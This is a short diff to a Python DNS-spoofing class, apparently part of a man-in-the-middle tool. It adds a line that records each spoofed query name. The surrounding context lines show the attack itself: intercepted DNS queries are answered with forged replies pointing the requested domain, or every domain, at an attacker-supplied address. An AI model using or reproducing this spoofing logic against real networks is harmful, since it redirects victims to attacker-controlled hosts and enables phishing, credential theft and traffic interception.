@@ -48,6 +48,7 @@ class DNSspoof(object):
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                 packet.set_payload(str(new_pkt))
                 packet.accept()
+                self.currentdomain = str(pkt[DNS].qd.qname)
 
             elif self.domain == "all":
                 new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -56,6 +57,7 @@ class DNSspoof(object):
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                 packet.set_payload(str(new_pkt))
                 packet.accept()
+                self.currentdomain = str(pkt[DNS].qd.qname)
 
             elif self.domain in pkt[DNS].qd.qname:
                 new_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
@@ -64,6 +66,7 @@ class DNSspoof(object):
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.fake))
                 packet.set_payload(str(new_pkt))
                 packet.accept()
+                self.currentdomain = str(pkt[DNS].qd.qname)
 
             else:
                 packet.accept()
